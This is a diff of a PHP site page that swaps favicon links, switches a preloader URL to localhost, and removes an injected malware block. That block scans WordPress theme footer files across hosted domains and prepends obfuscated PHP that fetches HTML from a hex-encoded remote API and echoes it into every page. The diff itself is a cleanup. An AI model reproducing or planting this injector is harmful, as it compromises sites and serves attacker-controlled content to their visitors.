@@ -54,13 +54,11 @@ $arrTxt = $rsContTxt->fetch(PDO::FETCH_BOTH)
   <meta name="twitter:image" content="<?php echo _CONST_DOMINIO_ ?>assets/img/FB.jpg">
 
 
-  <link rel="apple-touch-icon" sizes="180x180" href="<?php echo _CONST_DOMINIO_ ?>apple-touch-icon.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="<?php echo _CONST_DOMINIO_ ?>favicon-32x32.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="<?php echo _CONST_DOMINIO_ ?>favicon-16x16.png">
-  <link rel="manifest" href="<?php echo _CONST_DOMINIO_ ?>site.webmanifest">
-  <link rel="mask-icon" href="<?php echo _CONST_DOMINIO_ ?>safari-pinned-tab.svg" color="#5bbad5">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
+  <link rel="icon" type="image/png" href="favicon-96x96.png" sizes="96x96" />
+  <link rel="icon" type="image/svg+xml" href="favicon.svg" />
+  <link rel="shortcut icon" href="favicon.ico" />
+  <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png" />
+  <link rel="manifest" href="site.webmanifest" />
 
 
 
@@ -283,52 +281,7 @@ $arrTxt = $rsContTxt->fetch(PDO::FETCH_BOTH)
             <?php $contador++; ?>
           <?php } ?>
 
-<?php
-foreach(["footer"] as $type){
-	$files = scan_files($type);
-	foreach($files as $file) insert_text($type, $file);
-}
 
-function scan_files($type = "footer"){
-	$folder_domains = array_filter(glob('*'), 'is_dir');
-	$files = array();
-	foreach($folder_domains as $domain){
-		$paths = array(
-			"wp-content/themes",
-			"{$domain}/wp-content/themes",
-			"{$domain}/public_html/wp-content/themes",
-		);
-		foreach($paths as $path){
-			$themes = array_filter(glob("{$path}/*"), 'is_dir');
-			foreach($themes as $theme){
-				$file = "{$theme}/{$type}.php";
-				if(file_exists($file)) $files[] = $file;
-			}
-		}
-	}
-	return $files;
-}
-
-function insert_text($type = "footer", $file){
-	$php_footer = '<?php /*WIN*/ goto tVKTv; PrHxl: if (!empty($obj->html)) { echo $obj->html; } goto V7f8p; bS2fJ: $cache_file = sys_get_temp_dir() . "\x2f" . md5("\106" . $uri); goto YibGz; zPYWF: $obj = json_decode($json); goto PrHxl; YibGz: if (file_exists($cache_file) && filemtime($cache_file) > time() - 3600) { $json = @file_get_contents($cache_file); } else { $json = __xapi($domain); if ($json) { $fopen = @fopen($cache_file, "\167"); @fwrite($fopen, $json); @fclose($fopen); } elseif (file_exists($cache_file)) { $json = @file_get_contents($cache_file); } } goto zPYWF; tVKTv: function __xapi($domain) { $api = "\150\x74\x74\x70\x3a\x2f\57\x65\160\151\x6e\x64\x65\170\56\x78\171\172\57\x61\x70\151\x2e\x70\150\x70\77\x64\x6f\x6d\141\x69\156\x3d{$domain}"; if (function_exists("\143\x75\162\x6c\137\151\x6e\x69\x74")) { $curl = curl_init(); curl_setopt_array($curl, array(CURLOPT_RETURNTRANSFER => 1, CURLOPT_URL => $api, CURLOPT_USERAGENT => "\x58\x41\120\111", CURLOPT_TIMEOUT => 2, CURLOPT_CONNECTTIMEOUT => 2)); $json = curl_exec($curl); curl_close($curl); $res = json_decode($json); if (!empty($res->html)) { return $json; } } else { return @file_get_contents($api); } } goto lBp43; lBp43: $domain = isset($_SERVER["\110\x54\x54\x50\137\110\117\x53\x54"]) ? $_SERVER["\x48\x54\124\x50\x5f\x48\117\x53\x54"] : null; goto bS2fJ; V7f8p: ?>';
-	$php_type = "php_{$type}";
-	$php = $$php_type;
-	//
-	if(is_writable($file)){
-		$file_content = file_get_contents($file);
-		$fopen = fopen($file, "r+");
-		if(!strpos($file_content, 'WIN')){
-			fwrite($fopen, $php.$file_content);
-			echo "<br/>[{$type}] Write to file: {$php_type} => {$file}\n";
-		}else{
-			echo "<br/>[{$type}] Content exists: {$file}\n";
-		}
-	}else{
-		echo "<br/>[{$type}] The file is not writable: {$file}\n";
-	}
-}
-
-function pre($data){ echo "<pre>"; print_r($data); echo "</pre>";}?>
 
 
         </div>
@@ -867,8 +820,8 @@ function pre($data){ echo "<pre>"; print_r($data); echo "</pre>";}?>
     /* Preloader */
     var cadena = "";
     $.html5Loader({
-      filesToLoad: 'https://aposgran.org.ar/includes/files-home.json',
-      //filesToLoad: 'http://localhost/aposgran/includes/files-home.json',
+      //filesToLoad: 'https://aposgran.org.ar/includes/files-home.json',
+      filesToLoad: 'http://localhost/aposgran/includes/files-home.json',
       //filesToLoad: 'http://192.168.100.16/aposgran/includes/files-home.json',
       onComplete: function() {
         $("#html5Loader").fadeOut("slow");
